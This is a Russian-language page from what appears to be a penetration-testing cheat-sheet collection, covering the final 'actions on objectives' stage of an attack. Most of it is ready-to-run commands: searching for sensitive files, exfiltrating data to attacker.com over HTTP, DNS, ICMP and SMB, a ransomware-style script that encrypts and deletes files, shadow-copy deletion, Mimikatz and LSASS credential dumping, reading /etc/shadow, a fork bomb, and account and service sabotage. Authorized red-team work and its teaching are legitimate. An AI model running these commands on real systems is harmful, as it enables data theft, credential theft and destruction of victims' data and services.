# 🎯 Этап 7: Действия для достижения цели

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[Английский оригинал](../07-Actions-Objectives.md) • [Русский указатель](../../README.ru.md)
[🇹🇷 Türkçe Sürüm](07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Цель:** Достичь конечной цели: вывести данные, уничтожить их или оказать иное воздействие.

---

## 📤 Вывод данных (эксфильтрация)

### Поиск конфиденциальных данных

#### Windows
```cmd
# Поиск конфиденциальных файлов
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Найти недавно изменённые файлы
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell — поиск по содержимому
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Поиск конфиденциальных файлов
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Недавние файлы
find / -mtime -7 -type f 2>/dev/null

# Большие файлы
find / -size +100M -type f 2>/dev/null
```

### Сжатие и подготовка данных

#### Windows
```powershell
# PowerShell — создать ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# tar со сжатием
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Создать сжатый архив
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# С шифрованием
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP с паролем
zip -r -e data.zip /sensitive/
```

### Способы вывода данных

> **Уточнение к примерам:** `curl -d @-` отправляет POST, хотя комментарий оригинала называет его GET. HTTP сам по себе не шифрует трафик: шифрование относится к HTTPS. Команда `vssadmin resize shadowstorage` изменяет размер хранилища теневых копий и сама по себе не отключает службу создания копий.

#### HTTP/HTTPS
```bash
# Загрузить данные на сервер через curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 через GET (небольшой объём данных; см. примечание)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# Отправка данных через PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### Вывод данных через DNS
```bash
# Кодировать данные в DNS-запросах
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Использование dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Вывод данных через ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Использование icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Копировать на общий ресурс атакующего
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Подключение и копирование (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Облачные службы
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Разрушительные действия (имитация программы-вымогателя)

> ⚠️ **ВНИМАНИЕ:** Только для согласованных операций Red Team!

### Имитация шифрования
```powershell
# PowerShell — шифрование файлов (имитация)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Удаление теневых копий томов
```cmd
# Удалить теневые копии (препятствует восстановлению)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Отключить теневые копии (формулировка оригинала; см. примечание)
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Сбор учётных данных

### Учётные данные Windows
```powershell
# Mimikatz — все учётные данные
mimikatz# sekurlsa::logonpasswords

# Выгрузить базу SAM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# Дамп LSASS
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Извлечь из дампа
pypykatz lsa minidump lsass.dmp
```

### Учётные данные Linux
```bash
# Файл shadow
cat /etc/shadow

# Ключи SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Файлы истории команд
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Файлы конфигурации
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Учётные данные браузеров
```bash
# Учётные данные Chrome (Windows)
# Расположение: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Учётные данные Firefox (Windows)
# Расположение: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne — все пароли браузеров
python laZagne.py all
```

---

## 🖥️ Воздействие на систему

### Отказ в обслуживании (DoS)
```bash
# Fork bomb в Linux — НЕ ЗАПУСКАТЬ!
:(){ :|:& };:

# Заполнить диск
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# Исчерпание ресурсов процессора
yes > /dev/null &
```

### Изменение учётных записей
```bash
# Изменить пароли всех пользователей (формулировка оригинала; команда меняет пароль administrator)
net user administrator NewP@ssw0rd!

# Отключить учётные записи
net user username /active:no

# Удалить пользователей
net user username /delete
```

### Нарушение работы служб
```cmd
# Остановить критически важные службы
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Отключить службы
sc config wuauserv start= disabled
```

---

## 📊 Краткий справочник

### Способы вывода данных

| Способ | Преимущества | Недостатки |
|--------|------|------|
| HTTP/HTTPS | Обычный трафик, шифрование | Может контролироваться |
| DNS | Часто не контролируется (зависит от среды) | Низкая скорость, ограничения размера |
| ICMP | Может проходить через межсетевые экраны | Очень низкая скорость |
| SMB | Быстро, штатными средствами | Только внутри сети (обобщение оригинала) |
| Облако | Легитимные службы | Нужны учётные данные |

### Приоритеты расположения данных

| Расположение | Ценность |
|----------|-------|
| Контроллер домена | Наивысшая — учётные данные AD |
| Файловые серверы | Высокая — документы |
| Почтовые серверы | Высокая — переписка |
| Серверы баз данных | Высокая — бизнес-данные |
| Серверы разработки | Средняя — исходный код |
| Рабочие станции пользователей | Средняя — локальные файлы |

---

## ✅ Контрольный список отчёта о пентесте

```markdown
- [ ] Задокументировать все скомпрометированные системы
- [ ] Перечислить все обнаруженные учётные данные
- [ ] Описать путь атаки от первоначального доступа
- [ ] Задокументировать использованные уязвимости
- [ ] Указать найденные места хранения конфиденциальных данных
- [ ] Предложить рекомендации по устранению
- [ ] Добавить хронологию действий
- [ ] Сделать снимки экрана, подтверждающие доступ
```

---

## 🔗 Связанные шпаргалки

- [Mimikatz](../../Mimikatz/README.md)
- [Команды Linux](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**Предыдущий этап:** [← 06 - Обход защиты](./06-Defense-Evasion.ru.md)

**Вернуться к обзору:** [🎯 Обзор цепочки атаки](./README.ru.md)

---

<p align="center">
  <b>🎯 Задача выполнена!</b><br>
  <i>Помните: выполняйте эти действия только при наличии разрешения!</i>
</p>
